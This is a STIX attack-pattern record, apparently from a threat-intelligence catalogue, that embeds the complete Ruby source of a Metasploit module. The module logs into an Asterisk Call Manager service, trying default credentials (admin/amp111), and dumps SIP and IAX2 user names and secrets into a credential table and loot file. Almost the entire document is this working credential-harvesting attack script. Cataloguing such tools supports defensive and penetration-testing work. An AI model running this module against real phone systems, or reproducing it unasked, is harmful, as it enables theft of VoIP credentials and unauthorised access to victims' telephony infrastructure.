{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ffe222a2-1270-4f67-ad98-e2754c705af1",
    "created": "2024-08-14T16:32:10.876878Z",
    "modified": "2024-08-14T16:32:10.876882Z",
    "name": "Asterisk Gather Credentials",
    "description": " This module retrieves SIP and IAX2 user extensions and credentials from Asterisk Call Manager service. Valid manager credentials are required. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/asterisk_creds.rb",
            "external_id": "asterisk_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.asterisk.name/sip1.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.asterisk.name/iax2.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.voip-info.org/wiki/view/Asterisk+manager+API"
        },
        {
            "source_name": "reference",
            "url": "https://www.voip-info.org/wiki-Asterisk+CLI"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Asterisk Gather Credentials',\n      'Description' => %q{\n        This module retrieves SIP and IAX2 user extensions and credentials from\n        Asterisk Call Manager service. Valid manager credentials are required.\n      },\n      'Author'      => 'bcoles',\n      'References'  =>\n        [\n          ['URL', 'http://www.asterisk.name/sip1.html'],\n          ['URL', 'http://www.asterisk.name/iax2.html'],\n          ['URL', 'https://www.voip-info.org/wiki/view/Asterisk+manager+API'],\n          ['URL', 'https://www.voip-info.org/wiki-Asterisk+CLI']\n        ],\n      'License'     => MSF_LICENSE))\n    register_options [\n      Opt::RPORT(5038),\n      OptString.new('USERNAME', [true, 'The username for Asterisk Call Manager', 'admin']),\n      OptString.new('PASSWORD', [true, 'The password for the specified username', 'amp111'])\n    ]\n  end\n\n  def run\n    vprint_status 'Connecting...'\n\n    connect\n    banner = sock.get_once\n\n    unless banner =~ %r{Asterisk Call Manager/([\\d\\.]+)}\n      fail_with Failure::BadConfig, 'Asterisk Call Manager does not appear to be running'\n    end\n\n    print_status \"Found Asterisk Call Manager version #{$1}\"\n\n    unless login\n      fail_with Failure::NoAccess, 'Authentication failed'\n    end\n\n    print_good 'Authenticated successfully'\n\n    @users = []\n    retrieve_users 'sip'\n    retrieve_users 'iax2'\n\n    if @users.empty?\n      print_error 'Did not find any users'\n      return\n    end\n\n    print_status \"Found #{@users.length} users\"\n\n    cred_table = Rex::Text::Table.new 'Header'  => 'Asterisk User Credentials',\n                                      'Indent'  => 1,\n                                      'Columns' => ['Username', 'Secret', 'Type']\n\n    @users.each do |user|\n      cred_table << [ user['username'],\n                      user['password'],\n                      user['type'] ]\n      report_cred user:     user['username'],\n                  password: user['password'],\n                  proof:    \"#{user['type']} show users\"\n    end\n\n    print_line\n    print_line cred_table.to_s\n\n    p = store_loot 'asterisk.user.creds',\n                   'text/csv',\n                   rhost,\n                   cred_table.to_csv,\n                   'Asterisk User Credentials'\n\n    print_good \"Credentials saved in: #{p}\"\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n    print_error e.message\n  ensure\n    disconnect\n  end\n\n  private\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address:      rhost,\n      port:         rport,\n      service_name: 'asterisk_manager',\n      protocol:     'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type:     :service,\n      module_fullname: fullname,\n      username:        opts[:user],\n      private_data:    opts[:password],\n      private_type:    :password\n    }.merge service_data\n\n    login_data = {\n      core:              create_credential(credential_data),\n      status:            Metasploit::Model::Login::Status::UNTRIED,\n      proof:             opts[:proof]\n    }.merge service_data\n\n    create_credential_login login_data\n  end\n\n  def send_command(cmd = '')\n    sock.put cmd\n\n    res = ''\n    timeout = 15\n    Timeout.timeout(timeout) do\n      res << sock.get_once while res !~ /\\r?\\n\\r?\\n/\n    end\n\n    res\n  rescue Timeout::Error\n    print_error \"Timeout (#{timeout} seconds)\"\n  rescue => e\n    print_error e.message\n  end\n\n  def login\n    vprint_status \"Authenticating as '#{username}'\"\n\n    req = \"action: login\\r\\n\"\n    req << \"username: #{username}\\r\\n\"\n    req << \"secret: #{password}\\r\\n\"\n    req << \"events: off\\r\\n\"\n    req << \"\\r\\n\"\n    res = send_command req\n\n    return false unless res =~ /Response: Success/\n\n    report_cred user:     username,\n                password: password,\n                proof:    'Response: Success'\n\n    report_service :host  => rhost,\n                   :port  => rport,\n                   :proto => 'tcp',\n                   :name  => 'asterisk'\n    true\n  end\n\n  def retrieve_users(type)\n    vprint_status \"Retrieving #{type.upcase} users...\"\n\n    req = \"action: command\\r\\n\"\n    req << \"command: #{type} show users\\r\\n\"\n    req << \"\\r\\n\"\n    res = send_command req\n\n    if res =~ /Response: Error/ && res =~ /Message: Permission denied/\n      print_error 'Insufficient privileges'\n      return\n    end\n\n    unless res =~ /Response: Follows/\n      print_error 'Unexpected reply'\n      return\n    end\n\n    # The response is a whitespace formatted table\n    # We're only interested in the first two columns: username and secret\n    # To parse the table, we need the characer width of these two columns\n    if res =~ /^(Username\\s+)(Secret\\s+)/\n      user_len = $1.length\n      pass_len = $2.length\n    else\n      print_error \"'#{type} show users' is not supported\"\n      return\n    end\n\n    users = res.scan(/^Username\\s+Secret.*?\\r?\\n(.*)--END COMMAND--/m).flatten.first\n\n    if users.blank?\n      print_error \"Did not find any #{type.upcase} users\"\n      return\n    else\n      print_status \"Found #{type.upcase} users\"\n    end\n\n    users.each_line do |line|\n      line.chomp!\n      user = line[0...user_len].sub(/\\s+$/, '')\n      pass = line[user_len...(user_len + pass_len)].sub(/\\s+$/, '')\n      @users << { 'username' => user, 'password' => pass, 'type' => type }\n    end\n  end\nend\n"
}